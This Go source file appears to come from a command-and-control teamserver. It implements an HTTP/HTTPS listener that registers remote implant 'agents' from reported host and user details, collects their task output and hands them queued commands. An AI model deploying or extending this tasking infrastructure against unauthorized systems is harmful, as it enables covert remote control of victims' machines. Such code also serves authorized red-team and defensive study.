package listeners

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/rs/zerolog/log"

	"apex/teamserver/internal/agents"
	"apex/teamserver/internal/tasks"
)

// Use detached context for DB/background work so agent disconnect doesn't cancel it.
var bgctx = context.Background()

type HTTPListener struct {
	config   Config
	server   *http.Server
	checkins chan CheckIn
	agents   *agents.Manager
	tasks    *tasks.Queue
	running  bool
	mu       sync.RWMutex
}

func NewHTTP(cfg Config, agentMgr *agents.Manager, taskQueue *tasks.Queue) *HTTPListener {
	return &HTTPListener{
		config:   cfg,
		checkins: make(chan CheckIn, 256),
		agents:   agentMgr,
		tasks:    taskQueue,
	}
}

func (h *HTTPListener) ID() string              { return h.config.ID }
func (h *HTTPListener) Name() string             { return h.config.Name }
func (h *HTTPListener) Protocol() Protocol       { return h.config.Protocol }
func (h *HTTPListener) BindAddress() string      { return h.config.BindAddress }
func (h *HTTPListener) BindPort() int            { return h.config.BindPort }
func (h *HTTPListener) CheckIns() <-chan CheckIn { return h.checkins }

func (h *HTTPListener) IsRunning() bool {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.running
}

func (h *HTTPListener) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", h.handleCheckIn)

	addr := fmt.Sprintf("%s:%d", h.config.BindAddress, h.config.BindPort)
	h.server = &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		BaseContext:  func(_ net.Listener) context.Context { return context.Background() },
	}

	h.mu.Lock()
	h.running = true
	h.mu.Unlock()

	log.Info().
		Str("protocol", string(h.config.Protocol)).
		Str("addr", addr).
		Str("name", h.config.Name).
		Msg("Listener started")

	var err error
	if h.config.Protocol == ProtocolHTTPS {
		certFile := h.config.Options["cert_file"]
		keyFile := h.config.Options["key_file"]
		certPath, keyPath, genErr := ensureTLSCerts(certFile, keyFile, h.config.ID)
		if genErr != nil {
			h.mu.Lock()
			h.running = false
			h.mu.Unlock()
			return fmt.Errorf("tls setup: %w", genErr)
		}
		h.server.TLSConfig = &tls.Config{MinVersion: tls.VersionTLS12}
		err = h.server.ListenAndServeTLS(certPath, keyPath)
	} else {
		err = h.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		h.mu.Lock()
		h.running = false
		h.mu.Unlock()
		return fmt.Errorf("listener serve: %w", err)
	}
	return nil
}

func (h *HTTPListener) Stop(ctx context.Context) error {
	h.mu.Lock()
	defer h.mu.Unlock()

	if h.server != nil {
		if err := h.server.Shutdown(ctx); err != nil {
			return fmt.Errorf("listener shutdown: %w", err)
		}
	}
	h.running = false

	log.Info().Str("name", h.config.Name).Msg("Listener stopped")
	return nil
}

type agentSysinfo struct {
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	PID          int    `json:"pid"`
	ProcessName  string `json:"process_name"`
	InternalIP   string `json:"internal_ip"`
	Sleep        int    `json:"sleep"`
	Jitter       int    `json:"jitter"`
}

type checkInRequest struct {
	Sysinfo *agentSysinfo       `json:"sysinfo,omitempty"`
	Results []taskResultPayload `json:"results,omitempty"`
}

type taskResultPayload struct {
	TaskID  string `json:"task_id"`
	Output  string `json:"output"`  // base64
	Success bool   `json:"success"`
}

type checkInResponse struct {
	AgentID string         `json:"agent_id,omitempty"`
	Tasks   []taskResponse `json:"tasks,omitempty"`
}

type taskResponse struct {
	ID        string `json:"id"`
	Command   string `json:"command"`
	Arguments string `json:"arguments"` // base64
}

func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		agentID = r.Header.Get("X-Request-ID")
	}
	if agentID == "" {
		agentID = r.URL.Query().Get("id")
	}

	log.Debug().
		Str("remote", r.RemoteAddr).
		Str("agent_id", agentID).
		Int("body_len", len(body)).
		Msg("Listener: incoming request")

	externalIP, _, _ := net.SplitHostPort(r.RemoteAddr)

	// Emit for legacy consumers (e.g. events)
	select {
	case h.checkins <- CheckIn{AgentID: agentID, ExternalIP: externalIP, Data: body}:
	default:
	}

	var req checkInRequest
	if len(body) > 0 {
		_ = json.Unmarshal(body, &req)
	}

	// First-time registration: no agent ID, body has sysinfo
	if agentID == "" && req.Sysinfo != nil {
		s := req.Sysinfo
		if s.Sleep <= 0 {
			s.Sleep = 60
		}
		if s.Jitter <= 0 {
			s.Jitter = 15
		}
		// Atomically dedupe or register (prevents race where concurrent check-ins all create new agents)
		agent := &agents.Agent{
			ID:          uuid.New().String(),
			Hostname:    s.Hostname,
			Username:    s.Username,
			OS:          s.OS,
			Arch:        s.Arch,
			PID:         s.PID,
			ProcessName: s.ProcessName,
			InternalIP:  s.InternalIP,
			ExternalIP:  externalIP,
			Sleep:       s.Sleep,
			Jitter:      s.Jitter,
			ListenerID:  h.config.ID,
		}
		// 24h window: reuse same agent if same host+user+pid+ip checked in recently
		registered, reused, err := h.agents.RegisterOrReuse(bgctx, agent, 24*time.Hour)
		if err != nil {
			log.Error().Err(err).Msg("Failed to register agent")
			http.Error(w, "registration failed", http.StatusInternalServerError)
			return
		}
		if reused {
			log.Debug().
				Str("existing_id", registered.ID).
				Str("hostname", s.Hostname).
				Msg("Returning existing agent_id (dedupe)")
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(checkInResponse{AgentID: registered.ID})
		return
	}

	// Returning agent: must have ID
	if agentID == "" {
		http.Error(w, "missing agent id", http.StatusBadRequest)
		return
	}

	// Publish task results and broadcast to operator UI (use bgctx for reliability)
	for _, res := range req.Results {
		out, _ := base64.StdEncoding.DecodeString(res.Output)
		tr := &tasks.TaskResult{
			TaskID:    res.TaskID,
			AgentID:   agentID,
			Output:    out,
			Success:   res.Success,
			Timestamp: time.Now(),
		}
		_ = h.tasks.PublishResult(bgctx, tr)
		h.agents.BroadcastTaskResult(agentID, tr)
		log.Debug().
			Str("agent_id", agentID).
			Str("task_id", res.TaskID).
			Int("output_len", len(out)).
			Bool("success", res.Success).
			Msg("Task result received and broadcast")
	}

	h.agents.CheckIn(agentID)

	// Dequeue pending tasks
	pending, err := h.tasks.Dequeue(bgctx, agentID)
	if err != nil {
		log.Warn().Err(err).Str("agent_id", agentID).Msg("Task dequeue failed")
	}

	respTasks := make([]taskResponse, 0, len(pending))
	for _, t := range pending {
		argsB64 := ""
		if len(t.Arguments) > 0 {
			argsB64 = base64.StdEncoding.EncodeToString(t.Arguments)
		}
		respTasks = append(respTasks, taskResponse{
			ID:        t.ID,
			Command:   t.Command,
			Arguments: argsB64,
		})
		log.Debug().
			Str("agent_id", agentID).
			Str("task_id", t.ID).
			Str("command", t.Command).
			Msg("Task delivered to agent")
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(checkInResponse{Tasks: respTasks})
}
